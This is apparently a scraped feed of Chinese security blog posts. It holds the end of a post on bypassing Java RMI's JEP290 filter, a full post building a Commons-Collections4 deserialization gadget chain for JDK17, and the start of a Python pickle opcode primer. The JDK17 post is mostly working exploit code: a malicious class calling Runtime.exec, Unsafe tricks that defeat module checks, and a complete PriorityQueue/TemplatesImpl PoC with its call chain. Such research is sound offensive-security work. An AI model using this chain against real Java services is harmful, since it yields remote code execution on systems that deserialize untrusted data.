getInputStream() throws IOException { if (this.in == null) { Transport.transportLog.log(Log.VERBOSE, \u0026#34;getting input stream\u0026#34;); this.in = new ConnectionInputStream(this.conn.getInputStream()); } return this.in; } 进行初始化，所以这里serialFilter为null，并不存在第一段通信设置的值\n及反序列化的时候也不会存在检测\n小结:\n这里我想表达什么呢，就是分清楚，这种方法为什么可以绕过JEP290，第一段通信是和Server端，第二段是和JMRP端。这里ConnectionInputStream其实就代表着ObjectInputStream，而第一段通信中设置的serialFilter只作用于第一段通信中，及只作用于Register和Server之间的readObject中！！（JEP290作用域）\n相信对上面的分析，对JEP290有比较清晰的理解了\n修复：\n在dirty()方法中建立通讯后，给this.filter设置了一个JEP290(表达式)\n然后在this.in的serialFilter中设置上这个filter\n然后被检测出来\nBypass 8u231~8u240 在8u231之前我们是通过dirty()这里绕过的，然后被修复了。8u231这里这是通过直接达到UnicastRef#invoke，不经过dirty()，仅靠第一次反序列化完成这些操作。但是下一个版本就被修了hhh，具体可以参考这篇https://www.anquanke.com/post/id/259059#h3-10\n参考：\nhttps://xz.aliyun.com/t/8706?time__1311=n4%2BxnD0DcDu0eD5Y40HpDUhEIDkB711H4D#toc-8\nhttps://www.anquanke.com/post/id/259059#h3-1\n","permalink":"https://Jiecub3.github.io/zh/posts/java/rmi-jep290/","summary":"前言：其实是写了RMI反序列化以及3端互打的，但是感觉基本上都是摘抄网上的有点啰嗦就删了。然后下文主要是讲绕过RMI反序列化中的JEP290","title":"RMI JEP290"},{"content":"0x01 前言 起因看到一篇文章说jdk17因为强封装（模块化），利用不了TemplatesImpl来作为反序列化的sink点了，于是去试了下。起初先写了个小demo，发现可以调用呀，然后就想搞一条完整的链子，然后这里选择的是CC4，因为他最后sink点就是TemplatesImpl,当然CC6，CC7，CC5改改应该也可以（CC5起点也要换），但是我懒就直接用CC4了。在jdk17 Module模式下，CC6可以直接套一层Unsafe就能直接rce了，但是实现加载字节码可以做更多事，于是俺研究了下，也是解决重重困难实现了最后的利用！\n环境 jdk17.0.8 pom.xml \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.12.1.GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; jdk17 模块检测\n早在jdk9就开始了模块化，但是真正实施是在jdk17。模块化简单理解将就是 java为了安全有一些类不想让你直接调用，但是java模块里面的类又需要相互调用，所以反射和new一个对象的时候会对调用类和被调用类进行一个模块检测（这里不只是检测调用和被调用类的模块关系，还有其他判断），好这里我们大概有个概念，jdk17 会进行模块检测\n0x02 初见端倪 先来看个小demo，这里需要用到Unsafe，不懂的同学可以先看看这个，简单说Unsafe这里是用来修改我们调用类的模块，从而绕过模块检测。\nUnsafe是一个偏底层的函数，我们这里是通过找到Field的地址，然后修改其指向我们设置的值\nTemplatesImpl test import javassist.ClassPool; import javassist.CtClass; import sun.misc.Unsafe; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; public class test_17 { public static void main(String[] args) throws Exception { System.out.println(Class.class.getModule().getName()); ClassPool pool = ClassPool.getDefault(); ClassLoader appClassLoader = ClassLoader.getSystemClassLoader(); pool.insertClassPath(new javassist.LoaderClassPath(appClassLoader)); CtClass clazz = pool.get(\u0026#34;eval\u0026#34;); byte[] code = clazz.toBytecode(); CtClass clazz2 = pool.get(Evil.class.getName()); byte[] code2 = clazz2.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;); patchModule(test_17.class,aClass); System.out.println(test_17.class.getModule().getName()); Object o = aClass.getDeclaredConstructor().newInstance(); setFiled(o,\u0026#34;_name\u0026#34;,\u0026#34;111\u0026#34;); setFiled(o,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code,code2}); setFiled(o,\u0026#34;_transletIndex\u0026#34;,0); //setFiled(o,\u0026#34;_auxClasses\u0026#34;,new HashMap\u0026lt;\u0026gt;()); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o); oos.close(); patchModule(test_17.class,eval.class); System.out.println(test_17.class.getModule().getName()); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); Templates o1 = (Templates) ois.readObject(); o1.getOutputProperties(); ois.close(); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unsafeField = UnsafeClass.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\u0026#34;getModule\u0026#34;).invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } demo中在反射前执行patchModule(test_17.class,aClass);修改模块，然后反序列化后调用getOutputProperties触发sink，然后这里生成bin文件后，注释掉前面代码，执行readobject是可以执行成功的。这里我就感觉好像跟我想的有点不一样了，我之前看那篇文章以为只要实例化类就会进行模块的检测。但是很显然这里肯定没有。\n0x03 构造 然后就开始尝试构造了\n1.eval.class 首先是恶意类，这里我没有继承AbstractTranslet，因为有模块检测那个东西，反正我当时很多报错，我就直接删了，这里分析代码可以用另一种方法代替\nimport java.io.IOException; public class eval { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } } public Class\u0026lt;?\u0026gt; getSuperclass(){ return eval.class; } } 尝试\n开始尝试过重写getSuperclass()方法绕过if判断，后面发现重写不了这个，原因应该是：这里_class[i]属于Class对象，然后Class是final不让继承，然后也就重写不了了\n解决\n那么这里会进入else，_auxClasses正常是null所以这里会空指针报错。但是这个值不能反射设置，这个值最后还是属于Hashtable，但是Hashtable不继承Serializable。那就看那些地方会对这个值进行赋值，看我们能不能调用到\n发现就在defineTransletClasses()上方就有，只要_bytecodes.length\u0026gt;1就行，ez很好满足\nsetFiled(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code,code2}); 这样设置就解决了，然后以为套一层Unsafe就能实现时，最大的问题来了\n2. boss newInstance 在transform最后调用点，TrAXFilter的实例化是通过newInstance实现，而这个属于反射，这里会进行模块检测！！！\n起初在poc中写句patchModule(invokerTransformer.getClass(),aClass);（aClass就是TrAXFilter.class），可以成功调用，但是下意识就反应到这是本地，客户端和服务端是一体的。相当于这个也修改了服务端invokerTransformer的模块hhh。\n然后这里沉思了下，能不能通过CC链中Transformer[]的构造执行patchModule()中的代码（Unsafe那块代码，修改模块），修改完模块然后再调用CC4后面的sink，然后拼接到一个Transformer[]里面进行利用\n然后看了下ConstantTransformer，发现返回的对象，和接收input没半毛钱关系，所以上面想法是可行的\npublic O transform(final I input) { return iConstant; } 2.1 怎么实现Unsafe 说干就干，慢着，你是说用invokerTransformer来实现下面这段代码？\nprivate static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unsafeField = UnsafeClass.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\u0026#34;getModule\u0026#34;).invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } 我们化简，也就要执行unsafe.getAndSetObject(currentClass,addr,ObjectModule);这句代码\n那就要好好理解invokerTransformer.transform中的逻辑了\npublic O transform(final Object input) { //化简下 final Class\u0026lt;?\u0026gt; cls = input.getClass(); final Method method = cls.getMethod(iMethodName, iParamTypes); return (O) method.invoke(input, iArgs); 尝试 那我们能不能直接传个Unsafe对象呢？no Unsafe不能反序列化\n后面想到getRuntime,然后去看发现有getUnsafe可以获得Unsafe对象 但是其实用不了hhh，不然干嘛还通过反射获得Unsafe对象嘛hhh。该方法还有@CallerSensitive这个注释会对调用者的classLoader进行检查，判断当前类是否由Bootstrap classLoader加载，如果不是的话就会抛出一个SecurityException异常。\n因为受到Runtime的构造和final Class\u0026lt;?\u0026gt; cls = input.getClass();这句代码的影响，我一直觉得要得到Unsafe对象才能进行调用。因为你传入的Unsafe.class经过input.getClass()，都会变成Class.class，会没有用的。我昨天这里一度以为无解了hhh 后面我一直看代码，发现getRuntime费那么大劲是因为Class没这个方法，但是有getDeclaredField，setAccessible这些方法。而Runtime对象也是为了exec的调用，并不是前面就要有对象才能调用。而且前面调用(Field unsafeField = UnsafeClass.getDeclaredField(\u0026quot;theUnsafe\u0026quot;);)本来就是通过Unsafe.class调用的，而不是Unsafe对象调用的，怎么就不能调用了？\n这个想法通尝试发现是可以，但是又有个问题 unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); theUnsafe是private，setAccessible这个调用不能少，就意味着unsafeField这个Filed对象得被调用两次，但是这在invokerTransformer中怎么可能实现呢？于是我想了能不能在外面执行unsafeField.setAccessible(true);，然后把unsafeField传到invokerTransformer中，其实不行Field也不继承Serializable啊，想p吃呢hhh\n解决 然后又思考了片刻，如果靠链子解决的话，那大概需要一个这样的结构吧\npublic T transform(final T input) { iTransformer.transform(input); return input; } 这里iTransformer.transform(input);去执行unsafeField.setAccessible(true);这段内容，执行完后还能返回之前的对象，后面正常调用。这样大概就能实现同一个对象被调用2次了！\n然后我就去找实现transform方法的类，其实不多，但是找下来基本上没什么吊用？但是注意到有一些类有execute，evaluate方法，但是实现transform方法的类里面又没看到那个对这个两个方法进行了调用。这里稍微有点蹊跷了，然后又去网上找了下思路，就看到之前CC改编的一些链子。然后看到一个对create()方法的调用，然后这个类其实没实现transform，但是他有create()。这里我也有点感觉了那execute，evaluate方法也很有可能是想用一个包下的类，于是我就去这个包下面一通找，hhh如果让我发现了点什么hhh\n我之所以会有上面这个想法，也是找transform()方法的时候，看到下面这两个调用，就很符合我的思路（看代码注释！）\nClosureTransformer public T transform(final T input) { iClosure.execute(input); //只要execute中可以控制调用transform，即可 return input; } IfTransformer public O transform(I input) { return this.iPredicate.evaluate(input) ? this.iTrueTransformer.transform(input) : this.iFalseTransformer.transform(input); //因为这里是三元表达式，所以其实会执行两句代码 //所以这里 evaluate(input) 可以控制调用transform，即可 } 然后其实感觉找到了很多可以用的。先写比较麻烦的吧，因为好用的都是后面才遇到wwww(调用想法就写到代码注释里吧方便点\n找到的一些类 ComparatorPredicate public boolean evaluate(final T target) { boolean result = false; final int comparison = comparator.compare(object, target);//这里是看到了compare，然后CC4这条链子也是有这个调用点，然后想能不能通过这里调用到transform，看了下compare()相关代码感觉是可行的但是有点麻烦 switch (criterion) { case EQUAL: result = comparison == 0; break; case GREATER: result = comparison \u0026gt; 0; break; case LESS: result = comparison \u0026lt; 0; break; case GREATER_OR_EQUAL: result = comparison \u0026gt;= 0; break; case LESS_OR_EQUAL: result = comparison \u0026lt;= 0; break; default: throw new IllegalStateException(\u0026#34;The current criterion \u0026#39;\u0026#34; + criterion + \u0026#34;\u0026#39; is invalid.\u0026#34;); } return result; } EqualPredicate public boolean evaluate(final T object) { if (equator != null) { return equator.equate(iValue, object); //这个是想到equate，equals也有相关的链子，这个未证实，感觉有就记录了 } else { return iValue.equals(object); } } 比较好用的 TransformerPredicate public boolean evaluate(final T object) { final Boolean result = iTransformer.transform(object);//这个需要有结果，但是setAccessible返回是void，所以这个可能用不了 if (result == null) { throw new FunctorException( \u0026#34;Transformer must return an instanceof Boolean, it was a null object\u0026#34;); } return result.booleanValue(); } 好用的\nTransformedPredicate public boolean evaluate(final T object) { final T result = iTransformer.transform(object); //这里不就完美了么hhh return iPredicate.evaluate(result); } TruePredicate public boolean evaluate(final T object) { return true; //这个控制下iPredicate.evaluate(result);结果，增加链子稳定性 } 最好用的\n这个是我唯一记录的一个execute方法的，但确实最好用的www，不是哥们？你直接就是梦中情execute\nTransformerClosure public void execute(final E input) { iTransformer.transform(input); } demo 那么我最后选择了这套组合\nClosureTransformer public T transform(final T input) { iClosure.execute(input); return input; } TransformerClosure public void execute(final E input) { iTransformer.transform(input); } 可以成功得到Unsafe对象，nice捏，这里我就直接拿我测试的poc了\nimport org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.*; import sun.misc.Unsafe; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { Class UnsafeClass = Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unsafeField = UnsafeClass.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Class\u0026lt;?\u0026gt; TrAXFilter = Class.forName(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\u0026#34;); Object ObjectModule = Class.class.getMethod(\u0026#34;getModule\u0026#34;).invoke(TrAXFilter); long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;packageName\u0026#34;)); // // System.out.println(addr); // System.out.println(Class.class.getModule().getClass()); // System.out.println(\u0026#34;1111\u0026#34;+TrAXFilter.getPackageName()); // unsafe.getAndSetObject(TrAXFilter,addr,\u0026#34;javax.xml\u0026#34;); // System.out.println(Class.class.getDeclaredField(\u0026#34;packageName\u0026#34;)); // System.out.println(ObjectModule); // System.out.println(ObjectModule.getClass().getName()); // Class\u0026lt;?\u0026gt; TrAXFilter2 = Class.forName(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\u0026#34;); // System.out.println(\u0026#34;222\u0026#34;+TrAXFilter2.getPackageName()); // final Class\u0026lt;?\u0026gt; cls = input.getClass(); // final Method method = cls.getMethod(iMethodName, iParamTypes); // return (O) method.invoke(input, iArgs); // InvokerTransformer invokerTransformer4 = new InvokerTransformer(\u0026#34;getAndSetObject\u0026#34;,new Class[]{Object.class,long.class,Object.class}, new Object[]{Class.forName(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\u0026#34;),60,\u0026#34;javax.xml\u0026#34;}); InvokerTransformer invokerTransformer3 = new InvokerTransformer(\u0026#34;get\u0026#34;,new Class[]{Object.class}, new Object[]{null}); InvokerTransformer invokerTransformer2 = new InvokerTransformer(\u0026#34;setAccessible\u0026#34;,new Class[]{boolean.class}, new Object[]{true}); TransformerClosure transformerClosure = new TransformerClosure(invokerTransformer2); ClosureTransformer ClosureTransformer = new ClosureTransformer(transformerClosure); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;getDeclaredField\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;theUnsafe\u0026#34;}); ConstantTransformer constantTransformer = new ConstantTransformer(UnsafeClass); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3}; Transformer keyTransformer = new ChainedTransformer(transformers); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(keyTransformer); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); Transformer o1 = (Transformer) ois.readObject(); ois.close(); // System.out.println(Class.forName(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\u0026#34;).getPackageName()); Object transform = o1.transform(null); System.out.println(transform); // System.out.println(Class.forName(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\u0026#34;).getPackageName()); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unsafeField = UnsafeClass.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\u0026#34;getModule\u0026#34;).invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } } 2.2 Module 本以为最难的问题已经解决了，但是又用新的问题了wwww\n后面其实就只是调用unsafe.getAndSetObject，他的参数都可以传然后调用。正当我这么想的时候突然一阵不好的预感\nunsafe.getAndSetObject(currentClass,addr,ObjectModule); 这里addr是一个long值，可以直接传，但是ObjectModule是一个Module类啊，不能反序列化，而且也不能通过前面的CC链transform构造，因为你构造出来也传不到参数的地方吧！www，这截止比上一个更卡死，简直无解！\n2.3 pn 没办法，只能抱着最后一丝希望去看看newInstance，是怎么进行模块检测的，看能不能通过其他方法绕过\n然后调试 调试 调试 啊 发现起初就是这个地方给我们return false的\n往下看，可以看到进行了模块比较，一样的话直接就会返回true\n然后后面会进去到Module类，这里调用的是被调用类（TrAXFilter）的Module.isExported\n然后跟到implIsExportedOrOpen，然后发现了这个isNamed()，这里代码意思是被调用类没有模块名字的话就直接返回true\n那简单呀用Unsafe把TrAXFilter的Module.name改了不久行了，这个想法我起初也觉得快成了。但其实Module类做了防护，java不会让我们得到这个的类Field。getDeclaredFields()出来都是空的。\n然后还想过能不能直接把Module设置成null呀，null能反序列化呀，其实纯扯，在进入isExported方法时其实就会报空指针错误！\n然后第二个和第三个if都没希望的，this==other的话前面代码就返回true了，然后isOpen()是false\n那只有最后点希望咯，跟进isStaticallyExportedOrOpen\n上面那个ifopenPackages是null，根本操作不了，然后看到下面这个if\n这个exportedPackages是一个Hashmap，会从这里面获取值，还记得这个pn是什么，是被调用类的模块名(com.sun.org.apache.xalan.internal.xsltc.trax),正常这里是没有对应的key，返回null的。\n我们跟进allows，wc，发现只要targets不为null，怎么样都返回true啊啊啊啊（下图是我已经操作过的，targets会有值\n也就是pn只要是exportedPackages中的任意一个key值不就行了，我们再回想下pn怎么来的\nString pkg = memberClass.getPackageName();//pkg就是pn return memberModule.isExported(pkg, currentModule); Class.class中 public String getPackageName() { String pn = this.packageName; if (pn == null) { ... } return pn; } 可以看到就是Class类中packageName属性，这还不容易？，Class类中module属性，我都能改，还改不你了？\n直接用Unsafe修改了packageName\n0x04 poc 心心念念的poc呜呜呜\n//import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; //import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.*; import sun.misc.Unsafe; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.PriorityQueue; public class CC4_17 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); ClassLoader appClassLoader = ClassLoader.getSystemClassLoader(); pool.insertClassPath(new javassist.LoaderClassPath(appClassLoader)); CtClass clazz = pool.get(\u0026#34;eval\u0026#34;); byte[] code = clazz.toBytecode(); CtClass clazz2 = pool.get(Evil.class.getName());//这里随便一个类就行，code2凑数用的 byte[] code2 = clazz2.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;); patchModule(CC4_17.class,aClass); Object templates = aClass.getDeclaredConstructor().newInstance(); setFiled(templates,\u0026#34;_name\u0026#34;,\u0026#34;111\u0026#34;); setFiled(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code,code2}); setFiled(templates,\u0026#34;_transletIndex\u0026#34;,0); Class\u0026lt;?\u0026gt; TrAXFilter = Class.forName(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\u0026#34;); InstantiateTransformer invokerTransformer5 = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); ConstantTransformer constantTransformer2 = new ConstantTransformer(TrAXFilter); InvokerTransformer invokerTransformer4 = new InvokerTransformer(\u0026#34;getAndSetObject\u0026#34;,new Class[]{Object.class,long.class,Object.class}, new Object[]{Class.forName(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\u0026#34;),60,\u0026#34;javax.xml\u0026#34;}); InvokerTransformer invokerTransformer3 = new InvokerTransformer(\u0026#34;get\u0026#34;,new Class[]{Object.class}, new Object[]{null}); InvokerTransformer invokerTransformer2 = new InvokerTransformer(\u0026#34;setAccessible\u0026#34;,new Class[]{boolean.class}, new Object[]{true}); TransformerClosure transformerClosure = new TransformerClosure(invokerTransformer2); ClosureTransformer ClosureTransformer = new ClosureTransformer(transformerClosure); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;getDeclaredField\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;theUnsafe\u0026#34;}); ConstantTransformer constantTransformer = new ConstantTransformer(Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;)); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3,invokerTransformer4,constantTransformer2,invokerTransformer5}; Transformer keyTransformer = new ChainedTransformer(transformers); // patchModule(invokerTransformer.getClass(),aClass); System.out.println(TrAXFilter.getModule().getName()); System.out.println(invokerTransformer.getClass().getModule().getName()); TransformingComparator transformingComparator = new TransformingComparator(keyTransformer); PriorityQueue priorityQueue = new PriorityQueue(2,transformingComparator); patchModule(CC4_17.class,priorityQueue.getClass()); Field size = priorityQueue.getClass().getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.setInt(priorityQueue, 2); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(priorityQueue); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unsafeField = UnsafeClass.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\u0026#34;getModule\u0026#34;).invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } 调用链 PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ---\u0026gt; 这里开始构造Unsafe对象，得到Filed对象 ClosureTransformer.transform() ---\u0026gt; 这里形成一个岔路，去构造setAccessible TransformerClosure.transform() InvokerTransformer.transform() ---\u0026gt; 这里执行setAccessible，然后又回到主线 InvokerTransformer.transform() ---\u0026gt; 执行get()，得到Unsafe对象 InvokerTransformer.transform()\t---\u0026gt; 执行getAndSetObject，修改pn ConstantTransformer.transform() ---\u0026gt;这里回到正常CC4链子 InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() 0x05 遗漏 写文章的时候看代码越看越感觉漏掉了什么，还记得我前面说到的一个利用尝试\u0026quot;null\u0026quot;，这个地方我分析的时候，把memberClass想成null了，其实不是，是memberClass.getModule()为null\n那么有点感觉了么少年？我tm直接把这两个的Moudle都用Unsafe改成null呗，经过俺的改造，Unsafe对象调用两次完全不是问题啊\n感觉是可行的，但是我懒，俺要去吃饭了，都9点了才写完！！\n","permalink":"https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/","summary":"0x01 前言 起因看到一篇文章说jdk17因为强封装（模块化），利用不了TemplatesImpl来作为反序列化的sink点了，于是去试了下。起初先","title":"jdk17\u0026CC链下利用TemplatesImpl"},{"content":" 参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7Ki%3D%3DWhbCCeC84D#toc-4\n这篇文章给我很大帮助，很感谢这篇文章，前一天我也是对pickle一窍不通，虽然早就接触过但都是脚本小子，正巧有道题引起了我，让我慢慢道来，让你一文速通pickle\n重点还是types.CodeType，但是pickle是基础\n前置知识 前置知识都搬参考文章的\n指令 描述 具体写法 栈上的变化 c 获取一个全局对象或import一个模块 c[module]\\n[instance]\\n 获得的对象入栈 o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） o 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） i[module]\\n[callable]\\n 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 N 实例化一个None N 获得的对象入栈 S 实例化一个字符串对象 S\u0026rsquo;xxx\u0026rsquo;\\n（也可以使用双引号、'等python字符串形式） 获得的对象入栈 V 实例化一个UNICODE字符串对象 Vxxx\\n 获得的对象入栈 I 实例化一个int对象 Ixxx\\n 获得的对象入栈 F 实例化一个float对象 Fx.x\\n 获得的对象入栈 R 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 R 函数和参数出栈，函数的返回值入栈 . 程序结束，栈顶的一个元素作为pickle.loads()的返回值 . 无 ( 向栈中压入一个MARK标记 ( MARK标记入栈 t 寻找栈中的上一个MARK，并组合之间的数据为元组 t MARK标记以及被组合的数据出栈，获得的对象入栈 ) 向栈中直接压入一个空元组 ) 空元组入栈 l 寻找栈中的上一个MARK，并组合之间的数据为列表 l MARK标记以及被组合的数据出栈，获得的对象入栈 ] 向栈中直接压入一个空列表 ] 空列表入栈 d 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） d MARK标记以及被组合的数据出栈，获得的对象入栈 } 向栈中直接压入一个空字典 } 空字典入栈 p 将栈顶对象储存至memo_n pn\\n 无 g 将memo_n的对象压栈 gn\\n 对象被压栈 0 丢弃栈顶对象 0 栈顶对象被丢弃 b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 b 栈上第一个元素出栈 s 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 s 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 u 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 u MARK标记以及被组合的数据出栈，字典被更新 a 将栈的第一个元素append到第二个元素(列表)中 a 栈顶元素出栈，第二个元素（列表）被更新 e 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 e MARK标记以及被组合的数据出栈，列表被更新 不太看得懂序列化的数据，不理解的可以看下面两个动图，很快就理解了，还不太理解可以再看看参考文章的demo，反正这个地方你要完全能看懂序列化的poc\n比较全的指令集 # Pickle opcodes. See pickletools.py for extensive docs. The listing # here is in kind-of alphabetical order of 1-character pickle code. # pickletools groups them by purpose. # 说明: # 1.如果对栈顶元素只说了取出,而没有说弹出的话那就说明只是将栈顶元素复制一份放到一个变量或者就是后面的操作对栈顶元素进行更新修改,但是这个栈顶元素是不会弹出的 # 2.部分说明中对数据进行操作先弹出然后进行操作再进行压栈,但是对照源码可能是对栈数组直接进行直接截取而并没有pop弹出或者append的压栈操作,我这里描述为弹出和压栈的过程是为了便于理解 # 3.用于指定后面需要读取的数据大小的字节读出来之后,有可能是按照字符字面大小读取,也可能是按照其16进制大小进行数据读取,例如字符\u0026#39;1\u0026#39;=\u0026#39;\\x31\u0026#39;,0x31=49可能是读取1字节大小也肯能是读取49字节大小,注意我的注释描述 # 4._struct.unpack解压\u0026lt;i格式数据的时候需要传入4字节大小的数据,然后会把4个字节左右顺序调换,得到一个8位的16进制数,最后将其转为一个10进制整数,例如_struct.unpack(\u0026#39;\u0026lt;i\u0026#39;, 